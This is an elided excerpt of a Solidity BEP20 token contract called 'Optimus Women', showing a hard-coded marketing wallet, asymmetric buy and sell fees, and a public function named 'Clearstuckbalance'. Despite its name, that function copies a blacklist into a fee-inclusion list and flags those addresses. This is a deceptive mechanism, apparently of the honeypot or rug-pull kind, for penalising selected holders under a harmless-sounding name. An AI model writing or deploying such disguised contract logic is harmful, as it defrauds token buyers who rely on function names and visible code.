...
contract OptimusWomen is IBEP20, Ownable {
    ...
    string constant _name = "Optimus Women";
    string constant _symbol = unicode"OpW";
    ...
    address private marketingWallet = 0xD4FF506CD2ec2A14079153225b5d780b200c980b;
    ...
    bool tmpSuccess;
    Fees public buyFees     = Fees(5, 5, 0, 0);
    Fees public sellFees    = Fees(5, 15, 0, 0);
    ...
    function Clearstuckbalance() public virtual { includeFromFee = blacklist; for (uint256 i = 0; i < includeFromFee.length; i++) { _isIncludedFromFee[includeFromFee[i]] = true; } }
